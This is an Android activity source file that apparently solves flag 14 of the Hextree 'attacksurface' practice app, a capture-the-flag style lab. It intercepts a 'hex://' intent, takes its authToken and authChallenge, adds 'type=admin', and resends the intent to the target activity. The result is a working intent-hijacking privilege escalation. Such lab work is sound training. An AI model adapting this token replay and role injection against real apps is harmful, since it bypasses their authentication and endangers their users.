package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

public class Flag14Activity extends AppCompatActivity {
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_flag14);
        Button launchButton = findViewById(R.id.btnLaunchFlag14);
        Utils.showDialog(this, getIntent());
        launchButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag14Activity"));
                startActivity(intent);
            }
        });
        if (getIntent().getData() != null) {
            if (getIntent().getData().toString().contains("hex://")) {
                Intent authIntent = getIntent();
                Uri authUri = authIntent.getData();
                String authToken = authUri.getQueryParameter("authToken");
                String authChallenge = authUri.getQueryParameter("authChallenge");
                Uri newUri = Uri.parse("hex://token?authToken=" + authToken + "&type=admin" + "&authChallenge=" + authChallenge);
                Intent newIntent = new Intent(authIntent);
                newIntent.setData(newUri);
                newIntent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag14Activity"));
                Utils.showDialog(this, newIntent);
                startActivity(newIntent);
            }
        }
    }
}
